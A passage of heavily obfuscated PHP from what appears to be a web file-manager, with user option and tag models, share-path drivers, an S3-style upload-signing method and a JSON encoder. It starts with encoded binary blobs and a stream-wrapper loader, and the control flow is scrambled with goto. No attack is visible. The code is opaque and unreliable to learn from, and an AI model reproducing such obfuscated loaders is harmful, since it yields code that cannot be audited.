\x6d\x9a\x69\x52\x1e\x3\xc4\x62\x84\x89\xe4\x3e\xe4\x7c\x46\xb8\x69\x5\x21\xfe\x32\x2a\xec\x5b\x74\xc0\x8c\x8\x15\x31\x14\x14\x24\xb7\x23\x70\x73\x1a\x56".base64_decode('cCpiQ5YIPLhmkVD5CXVn0XYdwwFgWxnXRgkRoDdXeH3gCTPpFrtsx18ZIFQo3hsjZS3DjVPcRLE=')."\xdb\x89\xca\x70\x92\x87\xf9\x98\x62\x17\xc9\x9e\x44\x13\x8b\xb9\xaf\xfc\xb1\x12\xc8\x81\x1c\x2f\x2\xbf\xfe\x8c\x8e\x8e\xe0\xa3\xe9\xde\xe5\xbe\x70\x24\x5c\x96\x14\xf4\x84\xc3\xfd\x81\x50\x7\x56\xe\x2d\x4b\x46\xb9\x84\x4b"."\372\262\244\140\167\240\167\242\64\157\217\307\347\57\113\203\227\366\120\145\225\276\35\211\223\174\101\124\113\217\337\117\65\304\312\153\341\153\137\302\153\202\356\252\370\311\152\41\243\321\203\112\233\366\12\75"."\x88\xe\xcb\x74\x9a\x40\xe6\xcf\xb6\xc6\x42\x58\xc9\xb1\x63\x2c\xa1\x38\xeb\x79\x82\x38\xe4\x6\x7d\xdb\x94\x5\xa\x65\xdb\xf\x41\x4a\x80\x97\xec\xbd\xa4\xb0\x10\xf5\xd2\x8\x1f\xd2\x66\xd3\x9f\x89\xc2\xa8\x71\xa2\xb6\xe"."\xbf\x99\x73\x59\x6e\xf0\x4\x38\x9a\x38\x88\x9\x9\x4\x29\xae\xc1\x8\x40\xb4\x4b\x6d\x37\x28\xb6\xce\x14\x56\xf4\xf2\x3b\x38\x4\xe1\x1d\x2\xeb\xbd\x98\x7a\x69\x18\xd2\xe2\xc2\xd9\x2c\xe6\x53\x16\xe\x25\xaa\x49\xe0\xb0"."\215\201\45\43\132\104\116\23\276\2\245\22\36\153\33\23\303\342\301\307\102\306\126\114\71\115\57\302\355\254\130\270\371\205\275\364\177\232\246\154\2\40\302\0\0"."".base64_decode(''), 10, -8))); goto dÀéƒà­Œé; F£§ÉÀ‚„Ç: $_SERVER[$_SERVER[£›Åú§µ][52]] = ("\x39\x34\x39\x39"."\67\66")+0;$_K92M="uywpZnbsPURWFCvCmYjtymf6fMPChqcZAEeKxjqXDQGYwEcuBNmztqpSYNtS663Dnv9kGGVpz3bI5J";; stream_wrapper_register($_SERVER[£›Åú§µ][53], $_SERVER[£›Åú§µ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($AÂ‘‚©çõÚ, $eÇÜ²ßäšÏ) { $BäÕìÆİëé =& $_SERVER[Ä¿Ş°¨]; if (isset(self::$_methodList[$AÂ‘‚©çõÚ])) { return @call_user_func_array(self::$_methodList[$AÂ‘‚©çõÚ], $eÇÜ²ßäšÏ); } else { if (method_exists($this, $AÂ‘‚©çõÚ)) { return call_user_func_array(array($this, $AÂ‘‚©çõÚ), $eÇÜ²ßäšÏ); } else { think_exception(__CLASS__ . $BäÕìÆİëé[4] . $AÂ‘‚©çõÚ . $BäÕìÆİëé[5]); } } } public static function __callStatic($Fïáºø¹, $F˜ŒŠÉÇÅ«) { if (isset(self::$_methodListStatic[$Fïáºø¹])) { return call_user_func_array(self::$_methodListStatic[$Fïáºø¹], $F˜ŒŠÉÇÅ«); } else { if (method_exists(self, $Fïáºø¹)) { return call_user_func_array(array(self, $Fïáºø¹), $F˜ŒŠÉÇÅ«); } else { show_json("{$Fïáºø¹}\x28\51\40\x6e\157\x74\x20\x65\x78\x69\163\x74\73", !1); } } } public static function addMethod($E¾¾¦…Ùë«, $añ‰Ê–Û†) { self::$_methodList[$E¾¾¦…Ùë«] = $añ‰Ê–Û†; } public static function addMethodStatic($DóôÆ­‚í—, $a×›ÊÅº) { self::$_methodListStatic[$DóôÆ­‚í—] = $a×›ÊÅº; } } goto A¼Êò…Ê„‹; fµøÊ¤íÑ‡: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\x6f\x70\164\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($e©«Óš»»œ) { $dÁÁâ¥ÇÕ¸ =& $_SERVER[Ä¿Ş°¨]; if (!defined($dÁÁâ¥ÇÕ¸[431])) { define($dÁÁâ¥ÇÕ¸[431], 0); } return "\x55\x73\145\162\x4f\160\x74\x69\157\156\x5f{$e©«Óš»»œ}\x5f" . USER_ID; } protected function filterWhere($d¬´¥áá„) { $fÖ¬İÙ¶é­ =& $_SERVER[Ä¿Ş°¨]; if (!defined($fÖ¬İÙ¶é­[431])) { define($fÖ¬İÙ¶é­[431], 0); } $d¬´¥áá„[$fÖ¬İÙ¶é­[1399]] = USER_ID; return $d¬´¥áá„; } public function cacheRemoveUser($b”èŞ°äÖÊ, $F˜á‰ÎÎœñ) { return Cache::remove("\125\163\145\162\x4f\160\164\x69\157\x6e\137{$b”èŞ°äÖÊ}\137" . $F˜á‰ÎÎœñ); } protected function optionDefault($BİõØ¡Ô¶À = '') { $dß¢Ò·Í¡¾ =& $_SERVER[Ä¿Ş°¨]; if ($BİõØ¡Ô¶À == $dß¢Ò·Í¡¾[33]) { return $GLOBALS[$dß¢Ò·Í¡¾[6]][$dß¢Ò·Í¡¾[2490]]; } if ($BİõØ¡Ô¶À == $dß¢Ò·Í¡¾[2491]) { return $GLOBALS[$dß¢Ò·Í¡¾[6]][$dß¢Ò·Í¡¾[2492]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\x2e\x74\141\x67\114\151\163\164"; public $modelType = "\x55\163\145\x72\x4f\x70\x74\151\x6f\156"; public $field = array("\156\x61\155\x65", "\x73\x74\x79\x6c\145", "\163\x6f\x72\x74"); public function listData($dÌò²Ş¡£¬ = false, $CÑ³š­šˆÃ = "\163\x6f\x72\164", $eÖªªŒù² = false) { return parent::listData($dÌò²Ş¡£¬, $CÑ³š­šˆÃ, $eÖªªŒù²); } public function remove($c ‘¶ÇëÄ) { return parent::remove($c ‘¶ÇëÄ); } public function add($B„î†ê»ª‰, $FèØÑÎ±Õ = "\x6c\x61\142\x65\154\55\147\x72\x65\171\55\x6e\x6f\x72\x6d\x61\x6c") { $E†³É•×± =& $_SERVER[Ä¿Ş°¨]; if ($this->findByName($B„î†ê»ª‰)) { return !1; } $B´Ó™ÏŒ«á = array($E†³É•×±[391] => $B„î†ê»ª‰, $E†³É•×±[441] => $FèØÑÎ±Õ, $E†³É•×±[2067] => $this->getSort($E†³É•×±[242]) + 1); return parent::insert($B´Ó™ÏŒ«á); } public function update($aåÂ’ºÔ¢, $d›’ÖøöŞ‰) { $aÔë¢”„Üá =& $_SERVER[Ä¿Ş°¨]; $a»ª‹íºÀ = $this->listData($aåÂ’ºÔ¢); $fÎ™®Äæ•¸ = $this->findByName($d›’ÖøöŞ‰[$aÔë¢”„Üá[28]]); if (!$a»ª‹íºÀ || $fÎ™®Äæ•¸ && $fÎ™®Äæ•¸[$aÔë¢”„Üá[372]] != $a»ª‹íºÀ[$aÔë¢”„Üá[372]]) { return !1; } return parent::update($aåÂ’ºÔ¢, $d›’ÖøöŞ‰); } public function moveTop($d…µ¤©ß£ä) { $FÅÂÜÃ¾ÇÕ =& $_SERVER[Ä¿Ş°¨]; $eš¸ò½ˆÚÅ = parent::listData(); $CŞÄÕ×éĞÆ = $this->getSort($FÅÂÜÃ¾ÇÕ[241]); foreach ($eš¸ò½ˆÚÅ as &$Cã‹÷êõ) { if ($Cã‹÷êõ[$FÅÂÜÃ¾ÇÕ[372]] == $d…µ¤©ß£ä) { $Cã‹÷êõ[$FÅÂÜÃ¾ÇÕ[2084]] = $CŞÄÕ×éĞÆ; continue; } $Cã‹÷êõ[$FÅÂÜÃ¾ÇÕ[2084]] += 1; } return parent::resetData($eš¸ò½ˆÚÅ); } public function moveBottom($A³£•Õ£¤Ã) { $D™Ä„”¼á¥ =& $_SERVER[Ä¿Ş°¨]; $cò½áåëÉ = $this->getSort($D™Ä„”¼á¥[242]) + 1; return parent::update($A³£•Õ£¤Ã, array($D™Ä„”¼á¥[2084] => $cò½áåëÉ)); } public function resetSort($c·ñ‚È‹) { goto Cƒİ³â‹¿; dÊ¹¡õ‚¦É: return parent::resetData($fí©õ¹«Ê‹); goto eáî‘Î“Õ±; E«ç†íé”º: for ($c¼¹ÕÈ˜¡Ü = 0; $c¼¹ÕÈ˜¡Ü < count($c·ñ‚È‹); $c¼¹ÕÈ˜¡Ü++) { $eß¼ÅŠÉ‘Ù[$c·ñ‚È‹[$c¼¹ÕÈ˜¡Ü] . $BÍ ¢ßó“[33]] = $c¼¹ÕÈ˜¡Ü + 1; } $fí©õ¹«Ê‹ = parent::listData(); foreach ($fí©õ¹«Ê‹ as &$aÒè†ó´éÜ) { $Fõà“ĞÛÊé = $eß¼ÅŠÉ‘Ù[$aÒè†ó´éÜ[$BÍ ¢ßó“[372]]]; $aÒè†ó´éÜ[$BÍ ¢ßó“[2084]] = $Fõà“ĞÛÊé ? $Fõà“ĞÛÊé : $aÒè†ó´éÜ[$BÍ ¢ßó“[2084]]; } goto dÊ¹¡õ‚¦É; Cƒİ³â‹¿: $BÍ ¢ßó“ =& $_SERVER[Ä¿Ş°¨]; $eß¼ÅŠÉ‘Ù = array(); $c·ñ‚È‹ = is_array($c·ñ‚È‹) ? $c·ñ‚È‹ : array(); goto E«ç†íé”º; eáî‘Î“Õ±: } private function getSort($fºõÏœƒÚ‘) { $E½ÇÒƒÄ§Æ =& $_SERVER[Ä¿Ş°¨]; $C‹…™¸¶™Ä = parent::listData(); $E¿‹È˜İÅ = array_to_keyvalue($C‹…™¸¶™Ä, $E½ÇÒƒÄ§Æ[33], $E½ÇÒƒÄ§Æ[2084]); if (!$E¿‹È˜İÅ) { $E¿‹È˜İÅ = array(0); } $f¤ù‘±ç = $fºõÏœƒÚ‘ == $E½ÇÒƒÄ§Æ[242] ? max($E¿‹È˜İÅ) : min($E¿‹È˜İÅ); return intval($f¤ù‘±ç); } } goto a‘Ø„éÔâ¥; A†ï‹³°è†: class PathDriverDriverShareItem { public function __construct($c‘äØ½£±) { $this->pathParse = $c‘äØ½£±; } public function __call($eÕßµµ°Õ, $BçÂìĞƒŞì) { $Aï‘Ì›£Şâ =& $_SERVER[Ä¿Ş°¨]; if (method_exists($this, $eÕßµµ°Õ)) { return; } $BÍØÙãñ”‘ = call_user_func_array(array($Aï‘Ì›£Şâ[1102], $eÕßµµ°Õ), $BçÂìĞƒŞì); $F­™·šĞˆ = array($Aï‘Ì›£Şâ[1103], $Aï‘Ì›£Şâ[1104], $Aï‘Ì›£Şâ[1105], $Aï‘Ì›£Şâ[1106], $Aï‘Ì›£Şâ[494], $Aï‘Ì›£Şâ[496], $Aï‘Ì›£Şâ[1107], $Aï‘Ì›£Şâ[102], $Aï‘Ì›£Şâ[1108], $Aï‘Ì›£Şâ[1109]); if (in_array($eÕßµµ°Õ, $F­™·šĞˆ)) { $BÍØÙãñ”‘ = $this->getPathOuter($BÍØÙãñ”‘); } return $BÍØÙãñ”‘; } public function copy($Dß÷Åô§ï¬, $Cº÷í¢º Å, $dŒõ¢ªå‚ƒ = false) { return $this->copyMove($Dß÷Åô§ï¬, $Cº÷í¢º Å, $dŒõ¢ªå‚ƒ, $_SERVER[Ä¿Ş°¨][494]); } public function move($dñéÚ Ã¾Ê, $Fò¾Š‘£ÅÎ, $D·â‘Ï»á = false) { return $this->copyMove($dñéÚ Ã¾Ê, $Fò¾Š‘£ÅÎ, $D·â‘Ï»á, $_SERVER[Ä¿Ş°¨][496]); } private function copyMove($eğ‘Œ—‹—·, $có°ªßÊè, $FÇåù‹³ , $b¨Àˆ›á) { goto e”Š¡¶ö¼è; Bƒ²ê”×¹: if ($c»•Š†ß·›->pathParse[$AäˆÈçšÈª[983]]) { $có°ªßÊè = $c»•Š†ß·›->pathParse[$AäˆÈçšÈª[983]]; } else { $có°ªßÊè = $cò¹š‡Ô°½; } $bãÜÅÑÙª = IO::copyMove($eğ‘Œ—‹—·, $có°ªßÊè, $FÇåù‹³ , $b¨Àˆ›á); $bãÜÅÑÙª = $this->getPathOuter($bãÜÅÑÙª); goto a·ÇĞ‹Ñë; a·ÇĞ‹Ñë: return $bãÜÅÑÙª; goto Càôø¹ŒÚ; e”Š¡¶ö¼è: $AäˆÈçšÈª =& $_SERVER[Ä¿Ş°¨]; $cò¹š‡Ô°½ = $có°ªßÊè; $c»•Š†ß·› = IO::driverMake($có°ªßÊè); goto Bƒ²ê”×¹; Càôø¹ŒÚ: } public function pathFather($e¯µ»ŒÒœ›) { return get_path_father($this->pathParse[$_SERVER[Ä¿Ş°¨][75]]); } public function iconvSystem($AÛÙø±ÍÅ•) { return $AÛÙø±ÍÅ•; } protected function infoParse($a‡Ä‡¢Áğ) { $dÁµã¿²¤Ö =& $_SERVER[Ä¿Ş°¨]; $Fõ¾–³ßöÅ = $this->pathParse[$dÁµã¿²¤Ö[443]][$dÁµã¿²¤Ö[1003]] . $this->pathParse[$dÁµã¿²¤Ö[996]]; $c‘‚ô÷Ê›¹ = IO::info($Fõ¾–³ßöÅ); $d•ÒÎ¸’í² = $this->pathParse[$dÁµã¿²¤Ö[443]]; return Action($dÁµã¿²¤Ö[1101])->_shareItemeParse($c‘‚ô÷Ê›¹, $d•ÒÎ¸’í²); } public function listAll($FÍ²„‹Ú’ä) { $dÚ¨ª‘†… =& $_SERVER[Ä¿Ş°¨]; $e¡¸æºŒ‚Ì = IO::listAll($FÍ²„‹Ú’ä); $c—ïë¢Öë  = $this->pathParse[$dÚ¨ª‘†…[443]]; foreach ($e¡¸æºŒ‚Ì as &$FÒóÇ…¨â¾) { check_abort(); $FÒóÇ…¨â¾ = array_merge(IO::info($FÒóÇ…¨â¾[$dÚ¨ª‘†…[75]]), $FÒóÇ…¨â¾); $FÒóÇ…¨â¾[$dÚ¨ª‘†…[396]] = Action($dÚ¨ª‘†…[1101])->_shareItemeParse($FÒóÇ…¨â¾, $c—ïë¢Öë ); } return $e¡¸æºŒ‚Ì; } public function getPathOuter($FÎĞÛ‚‚Ñù) { goto DÏ¢ª†˜¥‡; C¾ºùÖßÀ: $fàæË±ó² = KodIO::clear($FÎĞÛ‚‚Ñù); $c³ÕÄ±œ‹ = KodIO::clear($this->pathParse[$A‡ï™ÚÇòî[443]][$A‡ï™ÚÇòî[1003]]); $C¾’ƒ‘¬Î• = substr($fàæË±ó², strlen($c³ÕÄ±œ‹)); goto F“ìë†¡Å; F“ìë†¡Å: if (substr($fàæË±ó², 0, strlen($c³ÕÄ±œ‹)) != $c³ÕÄ±œ‹) { return !1; } return $this->pathParse[$A‡ï™ÚÇòî[997]] . $A‡ï™ÚÇòî[8] . ltrim($C¾’ƒ‘¬Î•, $A‡ï™ÚÇòî[8]); goto f¥Îªˆ¦˜¿; DÏ¢ª†˜¥‡: $A‡ï™ÚÇòî =& $_SERVER[Ä¿Ş°¨]; $CØğ»¬¡­‰ = KodIO::parse($FÎĞÛ‚‚Ñù); if ($CØğ»¬¡­‰[$A‡ï™ÚÇòî[29]] == KodIO::KOD_SHARE_ITEM) { return $CØğ»¬¡­‰[$A‡ï™ÚÇòî[75]]; } goto C¾ºùÖßÀ; f¥Îªˆ¦˜¿: } public function getType() { $BÉÌŞ»›‹ =& $_SERVER[Ä¿Ş°¨]; $aá¿ÕÅÊÈ° = str_replace($BÉÌŞ»›‹[71], $BÉÌŞ»›‹[33], get_class($this)); return strtolower($aá¿ÕÅÊÈ°); } public function isTypeObject($EÌàÅ¶ÖĞï) { return IO::isTypeObject($EÌàÅ¶ÖĞï); } public function info($F•»‘…ÕëÚ) { return $this->infoParse($F•»‘…ÕëÚ); } public function infoAuth($aÓªŞ„ß®) { return $this->infoParse($aÓªŞ„ß®); } public function infoWithChildren($EµË‹…†æí) { return $this->infoParse($EµË‹…†æí); } public function infoFull($fÑ¦È»Ÿï) { return $this->infoParse($fÑ¦È»Ÿï); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($cºÏğ· ÓÉ) { $this->pathParse = $cºÏğ· ÓÉ; } protected function infoParse($E”Ä°®®›İ) { $dõ¨’®†Åë =& $_SERVER[Ä¿Ş°¨]; return Action($dõ¨’®†Åë[1002])->sharePathInfo($this->pathParse[$dõ¨’®†Åë[75]], !0); } public function listPath($c‰¡Ñæ¢‘ó, $b‡³ÍŠÎå‘ = false) { $DÓÎÅ´ùÑÑ =& $_SERVER[Ä¿Ş°¨]; $D›ï§®–” = IO::listPath($c‰¡Ñæ¢‘ó, $b‡³ÍŠÎå‘); foreach ($D›ï§®–” as $bæ‚ë¹‚¬Ú => $dÖğ¼âòâß) { if (!in_array($bæ‚ë¹‚¬Ú, array($DÓÎÅ´ùÑÑ[73], $DÓÎÅ´ùÑÑ[74]))) { continue; } foreach ($dÖğ¼âòâß as $B»œãáã‰ô => $b–ëÄåËÔÏ) { $b–ëÄåËÔÏ = Action($DÓÎÅ´ùÑÑ[1110])->parsePathChildren($b–ëÄåËÔÏ, array($DÓÎÅ´ùÑÑ[392] => $c‰¡Ñæ¢‘ó)); $D›ï§®–”[$bæ‚ë¹‚¬Ú][$B»œãáã‰ô] = Action($DÓÎÅ´ùÑÑ[1002])->shareItemInfo($b–ëÄåËÔÏ); } } return $D›ï§®–”; } public function listAll($Aã…šè–ò˜) { $bªï¯Ó¦ô¢ =& $_SERVER[Ä¿Ş°¨]; $A­ô•¬ìÌ = IO::listAll($Aã…šè–ò˜); foreach ($A­ô•¬ìÌ as &$aË°¥Îâ“) { $aË°¥Îâ“ = array_merge(IO::info($aË°¥Îâ“[$bªï¯Ó¦ô¢[75]]), $aË°¥Îâ“); $aË°¥Îâ“[$bªï¯Ó¦ô¢[396]] = Action($bªï¯Ó¦ô¢[1002])->shareItemInfo($aË°¥Îâ“); } return $A­ô•¬ìÌ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($E„¼Ü÷¦œ˜) { parent::__construct($E„¼Ü÷¦œ˜); $this->signatureVersion($_SERVER[Ä¿Ş°¨][196]); } public function uploadFormData($F•İ¼µ‹», $e…Àˆè¯ = 3600) { goto CÒßòÒáô; d©Ê¢ĞŞµ: $F†Ëİ‘‰Õï = base64_encode(json_encode($E¹È¾æáÄ‹)); $cÆ—Ñä’Úº = hash_hmac($e±—Ô’œ¯¯[1121], $C–†ÒŠßƒ¸, $e±—Ô’œ¯¯[1122] . $this->secret, !0); $bÙäŠ„á¹è = hash_hmac($e±—Ô’œ¯¯[1121], $this->region, $cÆ—Ñä’Úº, !0); goto B‰£«áß‚ ; B‰£«áß‚ : $Fù¯ÍÔÙ‚š = hash_hmac($e±—Ô’œ¯¯[1121], $a®‰ƒœï§ñ, $bÙäŠ„á¹è, !0); $B§Û§‡İÈ = hash_hmac($e±—Ô’œ¯¯[1121], $F¡„ØîÀŒ¡, $Fù¯ÍÔÙ‚š, !0); $EöŞô…óŸì = hash_hmac($e±—Ô’œ¯¯[1121], $F†Ëİ‘‰Õï, $B§Û§‡İÈ); goto cì‡áß”‡; C†ï‹›”‚: $F¡„ØîÀŒ¡ = $e±—Ô’œ¯¯[1113]; $dí‘ŠÄé«Â = $e…Àˆè¯ . $e±—Ô’œ¯¯[33]; $C–ËÔæ÷ = $e±—Ô’œ¯¯[1078]; goto eááÁ™‘ãÔ; eááÁ™‘ãÔ: $fÑ…Ñ³÷ÖÜ = array($this->accessKey, $C–†ÒŠßƒ¸, $this->region, $a®‰ƒœï§ñ, $F¡„ØîÀŒ¡); $bÓØ†ßæˆ¢ = implode($e±—Ô’œ¯¯[8], $fÑ…Ñ³÷ÖÜ); $E¹È¾æáÄ‹ = array($e±—Ô’œ¯¯[1080] => gmdate($e±—Ô’œ¯¯[1079], strtotime($e±—Ô’œ¯¯[1114])), $e±—Ô’œ¯¯[1081] => array(array($e±—Ô’œ¯¯[1083] => $this->bucket), array($e±—Ô’œ¯¯[1082] => $a‹ƒ“‘Ûƒ), array($e±—Ô’œ¯¯[1084], $e±—Ô’œ¯¯[1085], $e±—Ô’œ¯¯[33]), array($e±—Ô’œ¯¯[1084], $e±—Ô’œ¯¯[1115], $e±—Ô’œ¯¯[33]), array($e±—Ô’œ¯¯[1084], $e±—Ô’œ¯¯[1116], $e±—Ô’œ¯¯[33]), array($e±—Ô’œ¯¯[1086] => $C–ËÔæ÷), array($e±—Ô’œ¯¯[1117] => $bÓØ†ßæˆ¢), array($e±—Ô’œ¯¯[1118] => $Bî ë²ˆ„), array($e±—Ô’œ¯¯[1119] => $FÏâñ‰œ­), array($e±—Ô’œ¯¯[1120] => $dí‘ŠÄé«Â))); goto d©Ê¢ĞŞµ; bÉ¾Õà„Ì›: $a®‰ƒœï§ñ = $e±—Ô’œ¯¯[59]; $FÏâñ‰œ­ = gmdate($e±—Ô’œ¯¯[1112]); $C–†ÒŠßƒ¸ = gmdate($e±—Ô’œ¯¯[684]); goto C†ï‹›”‚; cì‡áß”‡: $eœ»†ò°ˆ· = array($e±—Ô’œ¯¯[195] => $e±—Ô’œ¯¯[33], $e±—Ô’œ¯¯[1123] => $e±—Ô’œ¯¯[33], $e±—Ô’œ¯¯[1082] => $a‹ƒ“‘Ûƒ, $e±—Ô’œ¯¯[1086] => $C–ËÔæ÷, $e±—Ô’œ¯¯[1090] => $F†Ëİ‘‰Õï, $e±—Ô’œ¯¯[1124] => $bÓØ†ßæˆ¢, $e±—Ô’œ¯¯[1125] => $Bî ë²ˆ„, $e±—Ô’œ¯¯[1126] => $FÏâñ‰œ­, $e±—Ô’œ¯¯[1127] => $dí‘ŠÄé«Â, $e±—Ô’œ¯¯[1128] => $EöŞô…óŸì, $e±—Ô’œ¯¯[165] => $this->getHost()); return $eœ»†ò°ˆ·; goto BĞäºõÇÙÑ; CÒßòÒáô: $e±—Ô’œ¯¯ =& $_SERVER[Ä¿Ş°¨]; $a‹ƒ“‘Ûƒ = $e±—Ô’œ¯¯[181]; $Bî ë²ˆ„ = $e±—Ô’œ¯¯[1111]; goto bÉ¾Õà„Ì›; BĞäºõÇÙÑ: } } goto fÛÔœÑéÎ; a– –—Ú§‡: define($_SERVER[Ä¿Ş°¨][1897], 32); class Services_JSON { function __construct($E„œÆ‚ÅÅ = 0) { $this->use = $E„œÆ‚ÅÅ; } function utf162utf8($cİÏ•Æøİ¤) { $d­Şœ°¾Ì =& $_SERVER[Ä¿Ş°¨]; if (function_exists($d­Şœ°¾Ì[68])) { return mb_convert_encoding($cİÏ•Æøİ¤, $d­Şœ°¾Ì[1548], $d­Şœ°¾Ì[1898]); } $DÒÕÊ™£é¼ = ord($cİÏ•Æøİ¤[0]) << 8 | ord($cİÏ•Æøİ¤[1]); switch (!0) { case (127 & $DÒÕÊ™£é¼) == $DÒÕÊ™£é¼: return chr(127 & $DÒÕÊ™£é¼); case (2047 & $DÒÕÊ™£é¼) == $DÒÕÊ™£é¼: return chr(192 | $DÒÕÊ™£é¼ >> 6 & 31) . chr(128 | $DÒÕÊ™£é¼ & 63); case (65535 & $DÒÕÊ™£é¼) == $DÒÕÊ™£é¼: return chr(224 | $DÒÕÊ™£é¼ >> 12 & 15) . chr(128 | $DÒÕÊ™£é¼ >> 6 & 63) . chr(128 | $DÒÕÊ™£é¼ & 63); } return $d­Şœ°¾Ì[33]; } function utf82utf16($FĞÏ œ†İ¹) { $Fš½°‘» =& $_SERVER[Ä¿Ş°¨]; if (function_exists($Fš½°‘»[68])) { return mb_convert_encoding($FĞÏ œ†İ¹, $Fš½°‘»[1898], $Fš½°‘»[1548]); } switch (strlen($FĞÏ œ†İ¹)) { case 1: return $FĞÏ œ†İ¹; case 2: return chr(7 & ord($FĞÏ œ†İ¹[0]) >> 2) . chr(192 & ord($FĞÏ œ†İ¹[0]) << 6 | 63 & ord($FĞÏ œ†İ¹[1])); case 3: return chr(240 & ord($FĞÏ œ†İ¹[0]) << 4 | 15 & ord($FĞÏ œ†İ¹[1]) >> 2) . chr(192 & ord($FĞÏ œ†İ¹[1]) << 6 | 127 & ord($FĞÏ œ†İ¹[2])); } return $Fš½°‘»[33]; } function encode($A¾‡²à»¤) { $aÑÏ™Š‚¸ò =& $_SERVER[Ä¿Ş°¨]; switch (gettype($A¾‡²à»¤)) { case $aÑÏ™Š‚¸ò[1559]: return $A¾‡²à»¤ ? $aÑÏ™Š‚¸ò[1558] : $aÑÏ™Š‚¸ò[1560]; case $aÑÏ™Š‚¸ò[1899]: return $aÑÏ™Š‚¸ò[99]; case $aÑÏ™Š‚¸ò[299]: return (int) $A¾‡²à»¤; case $aÑÏ™Š‚¸ò[274]: case $aÑÏ™Š‚¸ò[273]: return (double) $A¾‡²à»¤; case $aÑÏ™Š‚¸ò[308]: $b„ãáŒ“¿á = $aÑÏ™Š‚¸ò[33]; $b‹Ãù³‰ÅÜ = strlen($A¾‡²à»¤); for ($e³–Ïö¸’„ = 0; $e³–Ïö¸’„ < $b‹Ãù³‰ÅÜ; ++$e³–Ïö¸’„) { $aãÊöµ¨© = ord($A¾‡²à»¤[$e³–Ïö¸’„]); switch (!0) { case $aãÊöµ¨© == 8: $b„ãáŒ“¿á .= $aÑÏ™Š‚¸ò[1900]; break; case $aãÊöµ¨© == 9: $b„ãáŒ“¿á .= $aÑÏ™Š‚¸ò[1535]; break; case $aãÊöµ¨© == 10: $b„ãáŒ“¿á .= $aÑÏ™Š‚¸ò[1533]; break; case $aãÊöµ¨© == 12: $b„ãáŒ“¿á .= $aÑÏ™Š‚¸ò[1901]; break; case $aãÊöµ¨© == 13: $b„ãáŒ“¿á .= $aÑÏ™Š‚¸ò[1534]; break; case $aãÊöµ¨© == 34: case $aãÊöµ¨© == 47: case $aãÊöµ¨© == 92: $b„ãáŒ“¿á .= $aÑÏ™Š‚¸ò[93] . $A¾‡²à»¤[$e³–Ïö¸’„]; break; case $aãÊöµ¨© >= 32 && $aãÊöµ¨© <= 127: $b„ãáŒ“¿á .= $A¾‡²à»¤[$e³–Ïö¸’„]; break; case ($aãÊöµ¨© & 224) == 192: $e¾Ñİİ÷‰ = pack($aÑÏ™Š‚¸ò[1902], $aãÊöµ¨©, ord($A¾‡²à»¤[$e³–Ïö¸’„ + 1])); $e³–Ïö¸’„ += 1; $a…âÁò®Åæ = $this->utf82utf16($e¾Ñİİ÷‰); $b„ãáŒ“¿á .= sprintf($aÑÏ™Š‚¸ò[1903], bin2hex($a…âÁò®Åæ)); break; case ($aãÊöµ¨© & 240) == 224: $e¾Ñİİ÷‰ = pack($aÑÏ™Š‚¸ò[1902], $aãÊöµ¨©, ord($A¾‡²à»¤[$e³–Ïö¸’„ + 1]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 2])); $e³–Ïö¸’„ += 2; $a…âÁò®Åæ = $this->utf82utf16($e¾Ñİİ÷‰); $b„ãáŒ“¿á .= sprintf($aÑÏ™Š‚¸ò[1903], bin2hex($a…âÁò®Åæ)); break; case ($aãÊöµ¨© & 248) == 240: $e¾Ñİİ÷‰ = pack($aÑÏ™Š‚¸ò[1902], $aãÊöµ¨©, ord($A¾‡²à»¤[$e³–Ïö¸’„ + 1]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 2]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 3])); $e³–Ïö¸’„ += 3; $a…âÁò®Åæ = $this->utf82utf16($e¾Ñİİ÷‰); $b„ãáŒ“¿á .= sprintf($aÑÏ™Š‚¸ò[1903], bin2hex($a…âÁò®Åæ)); break; case ($aãÊöµ¨© & 252) == 248: $e¾Ñİİ÷‰ = pack($aÑÏ™Š‚¸ò[1902], $aãÊöµ¨©, ord($A¾‡²à»¤[$e³–Ïö¸’„ + 1]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 2]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 3]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 4])); $e³–Ïö¸’„ += 4; $a…âÁò®Åæ = $this->utf82utf16($e¾Ñİİ÷‰); $b„ãáŒ“¿á .= sprintf($aÑÏ™Š‚¸ò[1903], bin2hex($a…âÁò®Åæ)); break; case ($aãÊöµ¨© & 254) == 252: $e¾Ñİİ÷‰ = pack($aÑÏ™Š‚¸ò[1902], $aãÊöµ¨©, ord($A¾‡²à»¤[$e³–Ïö¸’„ + 1]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 2]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 3]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 4]), ord($A¾‡²à»¤[$e³–Ïö¸’„ + 5])); $e³–Ïö¸’„ += 5; $a…âÁò®Åæ = $this->utf82utf16($e¾Ñİİ÷‰); $b„ãáŒ“¿á .= sprintf($aÑÏ™Š‚¸ò[1903], bin2hex($a…âÁò®Åæ)); break; } } return $aÑÏ™Š‚¸ò[112] . $b„ãáŒ“¿á . $aÑÏ™Š‚¸ò[112]; case $aÑÏ™Š‚¸ò[1904]: if (is_array($A¾‡²à»¤) && count($A¾‡²à»¤) && array_keys($A¾‡²à»¤) !== range(0, sizeof($A¾‡²à»¤) - 1)) { $bŸÖÓ”Ö„ = array_map(array($this, $aÑÏ™Š‚¸ò[1905]), array_keys($A¾‡²à»¤), array_values($A¾‡²à»¤)); foreach ($bŸÖÓ”Ö„ as $F•Ş¤¯ï) { if (Services_JSON::isError($F•Ş¤¯ï)) { return $F•Ş¤¯ï; } } return $aÑÏ™Š‚¸ò[1053] . join($aÑÏ™Š‚¸ò[47], $bŸÖÓ”Ö„) . $aÑÏ™Š‚¸ò[311]; } $c‚Ï¢óŠÅ = array_map(array($this, $aÑÏ™Š‚¸ò[1906]), $A¾‡²à»¤); foreach ($c‚Ï¢óŠÅ as $Aõ‰Ÿö•ÊÙ) { if 